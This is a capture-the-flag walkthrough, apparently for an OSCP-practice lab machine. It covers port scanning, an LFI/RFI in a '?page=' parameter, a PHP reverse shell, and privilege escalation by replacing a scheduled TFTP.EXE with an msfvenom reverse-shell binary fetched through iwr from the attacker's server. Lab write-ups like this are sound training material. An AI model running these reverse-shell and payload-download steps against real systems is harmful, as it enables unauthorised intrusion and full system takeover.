> Noamro08 - 8 Feb 2024

### Target: 192.168.153.53

---
## Enumeration:

nmap scan - default scripts, services,m Top-1000-ports:
```bash
nmap -Pn -n -A 192.168.153.53 -oN scan.inital
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-08 22:03 IST
Nmap scan report for 192.168.153.53
Host is up (0.084s latency).
Not shown: 993 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           FileZilla ftpd 0.9.41 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3306/tcp open  mysql?
| fingerprint-strings: 
|   NULL, SIPOptions, TerminalServerCookie: 
|_    Host '192.168.45.161' is not allowed to connect to this MariaDB server
4443/tcp open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.153.53:4443/dashboard/
8080/tcp open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.153.53:8080/dashboard/
|_http-open-proxy: Proxy might be redirecting requests
```

all-ports:
```bash
nmap -Pn -n -p- 192.168.153.53 -oN all.ports --min-rate=5000
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-08 22:05 IST
Nmap scan report for 192.168.153.53
Host is up (0.081s latency).
Not shown: 65521 closed tcp ports (conn-refused)
PORT      STATE SERVICE
21/tcp    open  ftp
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3306/tcp  open  mysql
4443/tcp  open  pharos
5040/tcp  open  unknown
8080/tcp  open  http-proxy
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
```

fuzzing dirs with ffuf on port 4443:
```bash
(kali㉿kali)-[~/…/oscp/PG/practice/slort]
└─$ ffuf -u http://192.168.157.53:8080/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -c

site                    [Status: 301, Size: 346, Words: 22, Lines: 10, Duration: 80ms]
```

## LFI: 
checking this "/site" we can see that potentially maybe there is an LFI:
![[Pasted image 20240209104657.png]]
in "?page=main.php"

so we try to get the "c:\Windows\System32\Drivers\etc\hosts" to verify this LFI:
![[Pasted image 20240209104834.png]]
it works there is an LFI, so maybe also RFI?
## RFI:

open http.server with python and testing it:
![[Pasted image 20240209105040.png]]
there is an RFI also.... so we can to get a rev shell from it

## Rev Shell:
creating php rev shell [PHP ivan Sincek](https://www.revshells.com/) after pentest monkey and others did not work:

now starting http.server with python, open nc listener and get this file to run on the target (php files executing by default):
![[Pasted image 20240209110918.png]]
<font color="#92d050">we get the rev shell!</font>
`cat C:\Users\rupert\Desktop\local.txt`

## PrivEsc:
in C:\ we can see abnormal directory "C:\Backup":
![[Pasted image 20240209114722.png]]
there we can see info.txt file:
```cmd
C:\Backup>type info.txt
type info.txt
Run every 5 minutes:
C:\Backup\TFTP.EXE -i 192.168.234.57 get backup.txt
```
interesting so if we can change this 'TFTP.EXE' to rev.exe file and it run by system we will get an system privileges shell:

i change this file name:
`ren TFTP.EXE TFTP.EXE_old`

and now i get the rev.exe on this machine:
* `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.152 LPORT=80 -f exe > rev.exe`
		creating the rev shell with msfvenom
* `mv rev.exe TFTP.EXE`
		changing the name of this file to 'TFTP.EXE'
* `python3 -m http.server 8081`
		open http.server
* `iwr http://192.168.45.152:8081/TFTP.EXE -out TFTP.EXE`
		  downloading the rev shell on the target with 'iwr'

now before that we opened a nc listener and we just need to wait 5 minutes:
![[Pasted image 20240209115421.png]]
<font color="#92d050">we got administrator privileges! </font>